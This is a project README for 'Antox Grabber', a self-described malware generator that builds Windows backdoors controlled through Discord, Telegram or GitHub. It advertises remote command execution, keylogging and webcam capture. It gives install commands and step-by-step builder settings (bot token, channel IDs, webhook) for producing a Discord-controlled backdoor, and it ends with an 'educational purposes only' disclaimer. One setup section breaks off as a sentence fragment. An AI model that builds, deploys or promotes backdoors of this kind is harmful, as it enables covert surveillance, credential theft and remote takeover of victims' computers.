<h1 align="center">
  <br>
  <br>
  Antox Grabber
  <br>
</h1>

<h4 align="center">Antox Command and Control</h4>

<p align="center">
    <img src="https://img.shields.io/badge/Backdoor_Platform-Windows-blue">
    <img src="https://img.shields.io/badge/Version-2.1.2-blue">
    <img src="https://img.shields.io/badge/Python-3.8.9-blue">
</p>

---

## What is Antox?

Antox is a malware generator that generates backdoors which use online platforms as C2s. This includes Discord, Telegram and Github. 

Our goal is to prove that anything can be a C2, if you want to :) ...

## How does it work?

The Antox backdoors are using libraries which allow the backdoor to act as a "Bot" for the above-mentioned platforms. Essentially the attacker contacts the bot and specifies a malicious command to execute on the target "Agent". 

Antox is equipped with a lot of features **some** of which are:
- Encrypted traffic (HTTPS)
- Running system commands on target Agent
- Keylogger (Limited to Discord)
- Grabbing webcam snaps
- Multiple online agents at a time (Limited to Discord & GitHub)

## Installation and Usage

Antox is better installed and used on Kali Linux:
```
git clone https://github.com/Anton-ai111/AntoxGrabber.git
cd ./AntoxGrabber
chmod +x setup.sh
./setup.sh
```
Once this is done we can use the builder. Let's build a discord based C2 backdoor:
```
python builder.py
use discord
set name <backdoor-name>
set guild-id <server id from discord>
set bot-token <discord bot token>
set channel-id <channel id from discord server>
set webhook <discord webhook>
build
```

## How to Setup Antox
Since the setup process is very specific for each platform.

## Contributors
Contributions are welcome to our GitHub repo! We value community involvement and appreciate all types of contributions, from bug reports to code. Join us in building something great and making a positive impact on the world. Get involved today!

## Disclaimer
This github repository is made for educational purposes only. The developer is not responsible for any misuse of this software. **Do not use this software for illegal purposes.**
